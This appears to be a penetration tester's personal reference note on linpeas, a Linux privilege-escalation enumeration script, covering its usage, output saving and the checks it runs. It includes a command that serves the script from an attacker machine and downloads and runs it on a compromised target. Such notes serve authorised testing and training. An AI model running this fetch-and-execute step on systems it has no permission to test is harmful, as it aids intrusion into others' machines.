---
tags: [tool, privesc, linux, enumeration]
tool: "linpeas"
category: "Privesc"
installed: true
phase: [enumeration, privesc]
---

# linpeas - Linux Privilege Escalation Enumeration

## Tool Overview
Purpose: Automated privilege escalation enumeration for Linux
Location: ~/tools/privesc/linux/linpeas.sh

## When to Use
- After gaining initial access to a Linux system
- To quickly identify potential privilege escalation vectors

## How to Use It

Basic Usage:
./linpeas.sh

Save Output:
./linpeas.sh | tee linpeas-output.txt

Quiet Mode:
./linpeas.sh -q

Transfer to Target:
On Kali: cd ~/tools/privesc/linux && python3 -m http.server 8000
On target: wget http://YOUR_IP:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh

## What It Finds
- Kernel exploits
- SUID binaries
- Sudo rights
- Writable files
- Cron jobs
- Running services
- Interesting files

## Related Tools
lse, pspy, les, deepce
